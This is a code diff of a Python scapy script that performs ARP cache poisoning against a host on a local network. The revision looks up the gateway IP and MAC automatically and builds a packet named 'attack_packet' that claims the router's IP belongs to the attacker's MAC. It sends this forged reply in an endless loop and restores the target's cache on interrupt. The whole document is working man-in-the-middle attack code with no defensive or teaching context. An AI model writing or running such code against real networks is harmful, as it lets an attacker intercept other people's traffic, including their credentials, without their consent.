@@ -1,22 +1,22 @@
-from scapy.all import Ether, ARP, sendp
-import socket
+from scapy.all import Ether, ARP, sendp, conf, getmacbyip, get_if_hwaddr
 import time
 
 def main(target):
-    # print(f"target: {target} type: {type(target)}")
-    spoof_ip = "192.168.1.1"
+    router_ip = conf.route.route()[2]
+    print(f"Router IP Address: {router_ip}")
+    router_mac = getmacbyip(router_ip)
+    my_mac = get_if_hwaddr(conf.iface)
     trg = target.split(',')
-    packet = Ether(dst=trg[1]) / ARP(
-        op=2,
-        pdst=trg[0],
-        hwdst=trg[1],
-        psrc=spoof_ip
-    )
+    attack_packet = Ether(dst=trg[1]) / ARP(op=2,pdst=trg[0],hwdst=trg[1],psrc=router_ip,hwsrc=my_mac)
     try:
         while True:
-            sendp(packet, verbose=False)
-            #print(f"Sent spoofed ARP reply to {trg[0]}")
-            #time.sleep()
+            sendp(attack_packet, verbose=False)
+            time.sleep(1)
     except KeyboardInterrupt:
-        print("stoping exploit...")
+        print("Fixing poisoned arp cache...")
+        restore_packet = Ether(dst=trg[1]) / ARP(op=2,pdst=trg[0],hwdst=trg[1],psrc=router_ip,hwsrc=router_mac)
+        for _ in range(10):
+            sendp(restore_packet, verbose=False)
+            time.sleep(1)
+
         
